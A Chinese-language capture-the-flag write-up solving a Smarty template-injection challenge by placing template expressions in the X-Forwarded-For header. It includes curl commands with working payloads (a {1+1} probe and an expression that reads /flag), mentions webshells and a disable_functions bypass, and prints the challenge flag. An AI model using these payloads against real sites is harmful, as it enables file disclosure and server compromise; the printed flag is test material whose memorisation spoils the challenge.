# smarty

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=83dd3049-5c04-4626-8c08-ffc9ad541136_2&task_category_id=3)

php的模板注入哦！

进入网站，功能是告诉你自己的ip地址。嗯，有用，但不是很有用。网站最下面有一行字。

- Build With Smarty !

[smarty](https://www.anquanke.com/post/id/272393)也是一个模板，肯定也有ssti。与python的flask不同，在smarty内注入需要使用{表达式}。思考一下，网站是怎么知道我的ip地址的？无非是xff或者client ip。本来想用bp测试xff字段的，但是不懂为啥我的bp每次发xff就卡，怎么都发不出去，于是我直接用curl了。

```bash
curl 'http://61.147.171.105:56563/' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: zh-CN,zh;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Cookie: commodity_id="2|1:0|10:1665805936|12:commodity_id|8:MTYyNA==|c04ee4a0fa0405f64ea936c9ec533c2e8964b8229210c62ce771debf354e262e"' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36' \
  -H 'X-Forwarded-For:{1+1}' \
  --compressed
```

发现服务器返回的ip变为了2。ssti稳了。然而真正的难题现在才开始。这题常用的注入方法一个都用不了，因为在查看phpinfo时，一堆函数都被禁用了，能用的目录也只有/var/www/html.虽然可以用file_put_contents写入小马，但是函数被禁用了，这个小马没法用啊。

看大佬的[wp](https://blog.csdn.net/weixin_44604541/article/details/109123323)，也跟我遇到了一样的问题。不过大佬查到了另一个大佬的解法：[无需sendmail：巧用LD_PRELOAD突破disable_fun](https://www.freebuf.com/articles/web/192052.html)。所以现在我们要做的就很简单了，先用file_put_contents往/var/www/html下写一个小马。

结果我发现用curl发不了，bp发不出去，？？？这题没法做了。可以看前面大佬的wp，不过注意他有一个小地方也就是传马那一块给错代码了，注意改一下哈。

几个月后又再buuctf上看见了这道题:[[CISCN2019 华东南赛区]Web11](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA]Web11)。但是人家的题就简单很多了，直接最简单的模板注入就搞定。

```
curl 'http://node4.buuoj.cn:27770/' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: zh-CN,zh;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36' \
-H 'X-Forwarded-For:{if show_source("/flag")}{/if}' \
  --compressed \
  --insecure
```

后面不甘心去攻防世界再试了一下，curl倒是发出去了，可是蚁剑死活连接不上。唉，给出buu的flag。

## Flag
- flag{a5649845-770f-4019-b57b-2dba670c4a5d}